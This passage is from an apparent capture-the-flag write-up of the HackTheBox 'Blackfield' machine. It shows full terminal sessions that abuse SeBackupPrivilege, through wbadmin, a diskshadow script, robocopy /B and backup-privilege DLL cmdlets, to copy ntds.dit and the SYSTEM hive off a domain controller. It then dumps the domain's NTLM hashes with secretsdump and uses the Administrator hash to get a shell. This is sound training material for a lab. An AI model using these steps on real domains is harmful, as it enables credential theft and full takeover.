share <code class="language-plaintext highlighter-rouge">C$</code> of the host itself, since we don’t have an interactive session we’ll be using <code class="language-plaintext highlighter-rouge">-quiet</code> flag which wont ask us for user input to start the backup operation.</p><h4 id="ntdsdit">NTDS.dit</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> <span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>CFX


    Directory: <span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        10/5/2020  11:24 AM                CFX

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp<span class="se">\C</span>FX&gt; wbadmin start backup <span class="nt">-backuptarget</span>:<span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp<span class="se">\C</span>FX<span class="se">\ </span><span class="nt">-include</span>:c:<span class="se">\W</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds
.dit <span class="nt">-quiet</span>
wbadmin 1.0 - Backup command-line tool
<span class="o">(</span>C<span class="o">)</span> Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other <span class="nb">users who </span>have access to the location or on a
network that has additional security precautions <span class="k">in </span>place.

Retrieving volume information...
This will back up <span class="o">(</span>C:<span class="o">)</span> <span class="o">(</span>Selected Files<span class="o">)</span> to <span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp<span class="se">\C</span>FX<span class="se">\.</span>
The backup operation to <span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp<span class="se">\C</span>FX<span class="se">\ </span>is starting.
Creating a shadow copy of the volumes specified <span class="k">for </span>backup...
Please <span class="nb">wait </span><span class="k">while </span>files to backup <span class="k">for </span>volume <span class="o">(</span>C:<span class="o">)</span> are identified.
This might take several minutes.
Creating a shadow copy of the volumes specified <span class="k">for </span>backup...
Please <span class="nb">wait </span><span class="k">while </span>files to backup <span class="k">for </span>volume <span class="o">(</span>C:<span class="o">)</span> are identified.
This might take several minutes.
Windows Server Backup is updating the existing backup to remove files that have
been deleted from your server since the last backup.
This might take a few minutes.
The backup of volume <span class="o">(</span>C:<span class="o">)</span> completed successfully.
Summary of the backup operation:
<span class="nt">------------------</span>

The backup operation successfully completed.
The backup of volume <span class="o">(</span>C:<span class="o">)</span> completed successfully.
Log of files successfully backed up:
C:<span class="se">\W</span>indows<span class="se">\L</span>ogs<span class="se">\W</span>indowsServerBackup<span class="se">\B</span>ackup-05-10-2020_18-26-09.log

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp<span class="se">\C</span>FX&gt; <span class="nb">ls


    </span>Directory: <span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp<span class="se">\C</span>FX


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----         10/5/2020  3:27 PM                WindowsImageBackup
</pre></table></code></div></div><p>Now that we have obtained WindowsImageBackup of <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file inside the SMB share, we’ll recovery the file inside our directory <code class="language-plaintext highlighter-rouge">cd C:\Users\svc_backup\Documents\</code></p><p>For recovering the backup we need the backup version:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; wbadmin get versions
wbadmin 1.0 - Backup command-line tool
<span class="o">(</span>C<span class="o">)</span> Copyright Microsoft Corporation. All rights reserved.

Backup <span class="nb">time</span>: 9/21/2020 4:00 PM
Backup location: Network Share labeled <span class="se">\\</span>10.10.14.4<span class="se">\b</span>lackfieldA
Version identifier: 09/21/2020-23:00
Can recover: Volume<span class="o">(</span>s<span class="o">)</span>, File<span class="o">(</span>s<span class="o">)</span>

Backup <span class="nb">time</span>: 10/5/2020 3:27 PM
Backup location: Network Share labeled <span class="se">\\</span>10.10.10.192<span class="se">\C</span><span class="nv">$\</span>Windows<span class="se">\T</span>emp<span class="se">\C</span>FX<span class="se">\</span>
Version identifier: 10/05/2020-22:27
Can recover: Volume<span class="o">(</span>s<span class="o">)</span>, File<span class="o">(</span>s<span class="o">)</span>
</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; wbadmin start recovery <span class="nt">-version</span>:10/05/2020-22:27 <span class="nt">-itemtype</span>:file <span class="nt">-items</span>:c:<span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit <span class="nt">-recoverytarget</span>:c:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments <span class="nt">-notrestoreacl</span> <span class="nt">-quiet</span>

wbadmin 1.0 - Backup command-line tool
<span class="o">(</span>C<span class="o">)</span> Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file<span class="o">(</span>s<span class="o">)</span> c:<span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit from the
backup created on 10/5/2020 3:27 PM to c:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments.
Preparing to recover files...

Successfully recovered c:<span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit to c:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\.</span>
The recovery operation completed.
Summary of the recovery operation:
<span class="nt">--------------------</span>

Recovery of c:<span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit to c:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\ </span>successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:<span class="se">\W</span>indows<span class="se">\L</span>ogs<span class="se">\W</span>indowsServerBackup<span class="se">\F</span>ileRestore-05-10-2020_22-34-53.log

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         10/5/2020  3:27 PM       18874368 ntds.dit

</pre></table></code></div></div><p>Great! we can now download the file to our machine:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; download ntds.dit
Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\n</span>tds.dit to ntds.dit


Info: Download successful!
</pre></table></code></div></div><h4 id="system-hive">SYSTEM hive</h4><p>To extract the NTLM hashes from <code class="language-plaintext highlighter-rouge">ntds.dit</code> file, we’ll be needing SYSTEM hive file which contains the System boot key essential to decrypt the NTDS.dit.</p><h4 id="grabbing-system">Grabbing SYSTEM:</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; reg save HKLM<span class="se">\S</span>YSTEM C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\S</span>YSTEM
The operation completed successfully.

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        10/5/2020   3:27 PM       18874368 ntds.dit
<span class="nt">-a----</span>        10/5/2020   2:56 PM       17661952 SYSTEM


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; download SYSTEM
Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\S</span>YSTEM to SYSTEM


Info: Download successful!

cfx:  ~/Documents/htb/blackfield
→ file SYSTEM
SYSTEM: MS Windows registry file, NT/2000 or above
</pre></table></code></div></div><h4 id="extracting-ntlm-hashes">Extracting NTLM hashes</h4><p>We got both the files required to extract NTLM hashes of Domain accounts using Impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> SYSTEM LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:4c67bfbc7834b2f39fae7138f717dcbd:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
<span class="o">[</span>..SNIP..]
</pre></table></code></div></div><h3 id="administrator-shell">Administrator Shell</h3><p>With newly acquired Administrator’s hash, we can use Evil-WinRM to get a shell:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ evil-winrm <span class="nt">-i</span> 10.10.10.192 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\a</span>dministrator
</pre></table></code></div></div><p>Grabbing <code class="language-plaintext highlighter-rouge">root.txt</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; get-content root.txt
49160cc348b7263<span class="k">*****************</span>
</pre></table></code></div></div><h2 id="privesc-method-2---diskshadow">PrivEsc Method #2 - diskshadow</h2><p>In second method, the strategy would be the same to grab <code class="language-plaintext highlighter-rouge">ntds.dit</code>, but instead we’ll use a different windows tool named <code class="language-plaintext highlighter-rouge">diskshadow</code>.</p><blockquote><p>Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).</p></blockquote><p>I found a great <a href="https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf"><strong>document</strong></a> which not only explains on the privilege escalation abusing <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> but also all using many other privileges on windows.</p><p>With reference to the commands mentioned under <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> from above documents, we’ll create a shadow drive of volume C:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ <span class="nb">cat </span>shadowscript.txt
<span class="nb">set </span>metadata C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\s</span>ss.cabs
<span class="nb">set </span>context clientaccessibles
<span class="nb">set </span>context persistents
begin backups
add volume c: <span class="nb">alias </span>coldfx#
creates
expose %coldfx% z:#
</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; upload shadowscript.txt
Info: Uploading shadowscript.txt to C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\s</span>hadowscript.txt


Data: 248 bytes of 248 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; diskshadow /s shadowscript.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  10/5/2020 4:30:22 PM

-&gt; <span class="nb">set </span>metadata C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\s</span>ss.cab
-&gt; <span class="nb">set </span>context clientaccessible
-&gt; <span class="nb">set </span>context persistent
-&gt; begin backup
-&gt; add volume c: <span class="nb">alias </span>coldfx
-&gt; create
Alias coldfx <span class="k">for </span>shadow ID <span class="o">{</span>87e12f70-64e3-4f5f-bebb-66a01dafae89<span class="o">}</span> <span class="nb">set </span>as environment variable.
Alias VSS_SHADOW_SET <span class="k">for </span>shadow <span class="nb">set </span>ID <span class="o">{</span>afca95ea-15c2-4467-8f35-70e36c7ed6fe<span class="o">}</span> <span class="nb">set </span>as environment variable.

Querying all shadow copies with the shadow copy <span class="nb">set </span>ID <span class="o">{</span>afca95ea-15c2-4467-8f35-70e36c7ed6fe<span class="o">}</span>

        <span class="k">*</span> Shadow copy ID <span class="o">=</span> <span class="o">{</span>87e12f70-64e3-4f5f-bebb-66a01dafae89<span class="o">}</span>               %coldfx%
                - Shadow copy <span class="nb">set</span>: <span class="o">{</span>afca95ea-15c2-4467-8f35-70e36c7ed6fe<span class="o">}</span>       %VSS_SHADOW_SET%
                - Original count of shadow copies <span class="o">=</span> 1
                - Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>351b4712-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
                - Creation <span class="nb">time</span>: 10/5/2020 4:30:40 PM
                - Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-&gt; expose %coldfx% z:
-&gt; %coldfx% <span class="o">=</span> <span class="o">{</span>87e12f70-64e3-4f5f-bebb-66a01dafae89<span class="o">}</span>
The shadow copy was successfully exposed as z:<span class="se">\.</span>
-&gt;
Note: END BACKUP was not commanded, writers not notified BackupComplete.
DiskShadow is exiting.
</pre></table></code></div></div><h4 id="shadow-drive-z">Shadow Drive Z:</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>Z:<span class="se">\</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS Z:<span class="se">\&gt;</span> <span class="nb">ls


    </span>Directory: Z:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        9/21/2020   3:58 PM                f
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
<span class="nt">-a----</span>        2/28/2020   4:36 PM            447 notes.txt

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS Z:<span class="se">\W</span>indows<span class="se">\n</span>tds&gt; <span class="nb">ls


    </span>Directory: Z:<span class="se">\W</span>indows<span class="se">\n</span>tds


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        10/5/2020   4:30 PM           8192 edb.chk
<span class="nt">-a----</span>        10/5/2020   4:30 PM       10485760 edb.log
<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edb00005.log
<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00001.jrs
<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00002.jrs
<span class="nt">-a----</span>        10/5/2020   4:30 PM       18874368 ntds.dit
<span class="nt">-a----</span>        10/5/2020   4:30 PM          16384 ntds.jfm
<span class="nt">-a----</span>        10/3/2020   3:29 PM         434176 temp.edb

</pre></table></code></div></div><p>I’ll now copy the file using <code class="language-plaintext highlighter-rouge">robocopy</code> with <code class="language-plaintext highlighter-rouge">/B</code> flag to ignore file permissions and use a new directory <code class="language-plaintext highlighter-rouge">new_ntds</code> to save the file:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; robocopy /B z:<span class="se">\W</span>indows<span class="se">\n</span>tds .<span class="se">\n</span>ew_ntds ntds.dit

<span class="nt">-------------------------------------------------------------------------------</span>
   ROBOCOPY     ::     Robust File Copy <span class="k">for </span>Windows
<span class="nt">-------------------------------------------------------------------------------</span>

  Started : Monday, October 5, 2020 4:56:08 PM
   Source : z:<span class="se">\W</span>indows<span class="se">\n</span>tds<span class="se">\</span>
     Dest : C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\n</span>ew_ntds<span class="se">\</span>

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

<span class="nt">------------------------------------------------------------------------------</span>

          New Dir          1    z:<span class="se">\W</span>indows<span class="se">\n</span>tds<span class="se">\</span>
            New File              18.0 m        ntds.dit
  0.0%
  0.3%
  <span class="o">[</span>..SNIP..]

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\n</span>ew_ntds&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\n</span>ew_ntds


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        10/5/2020  3:48 PM       18874368 ntds.dit
</pre></table></code></div></div><p>Bingo ! Now we can now download <code class="language-plaintext highlighter-rouge">ntds.dit</code> using <code class="language-plaintext highlighter-rouge">download</code> command. For generating SYSTEM hive we’ll use the same command <code class="language-plaintext highlighter-rouge">reg save HKLM\SYSTEM C:\Users\svc_backup\Documents\SYSTEM</code> used in Method #1</p><h3 id="copy-filesebackupprivilege">Copy-FileSeBackupPrivilege</h3><p>An alternate way to copy files from the <code class="language-plaintext highlighter-rouge">shadow drive Z:\</code> is by uploading <code class="language-plaintext highlighter-rouge">SeBackupPrivilegeUtils.dll</code> and <code class="language-plaintext highlighter-rouge">SeBackupPrivilegeCmdLets.dll</code> from <a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug"><strong>SeBackupPrivilege</strong></a> repo and importing them to our session.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; upload SeBackupPrivilegeCmdLets.dll
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; upload SeBackupPrivilegeUtils.dll

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        10/5/2020   3:48 PM                new_ntds
<span class="nt">-a----</span>        10/5/2020   5:14 PM          12288 SeBackupPrivilegeCmdLets.dll
<span class="nt">-a----</span>        10/5/2020   5:14 PM          16384 SeBackupPrivilegeUtils.dll
</pre></table></code></div></div><h4 id="importing-dlls">Importing dll’s:</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>eBackupPrivilegeUtils.dll
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>eBackupPrivilegeCmdLets.dll
</pre></table></code></div></div><p>Now we can use <code class="language-plaintext highlighter-rouge">Copy-FileSeBackupPrivilege</code> to copy files from our Shadow drive to the desired directory:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; Copy-FileSeBackupPrivilege Z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments<span class="se">\n</span>tds.dit
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        10/5/2020   3:38 PM                new_ntds
<span class="nt">-a----</span>        10/5/2020   5:17 PM       18874368 ntds.dit
<span class="nt">-a----</span>        10/5/2020   5:14 PM          12288 SeBackupPrivilegeCmdLets.dll
<span class="nt">-a----</span>        10/5/2020   5:14 PM          16384 SeBackupPrivilegeUtils.dll
<span class="nt">-a----</span>        10/5/2020   4:29 PM            186 shadowscript.txt
<span class="nt">-a----</span>        10/5/2020   4:36 PM       17682432 SYSTEM
</pre></table></code></div></div><p>Downloading both the newly obtained <code class="language-plaintext highlighter-rouge">SYSTEM</code> &amp; <code class="language-plaintext highlighter-rouge">ntds.dit</code> and Running <code class="language-plaintext highlighter-rouge">secretsdump.py</code> to dump Administrator hash.</p><h4 id="administrator-shell-1">Administrator Shell</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> SYSTEM LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
<span class="o">[</span>..SNIP..]
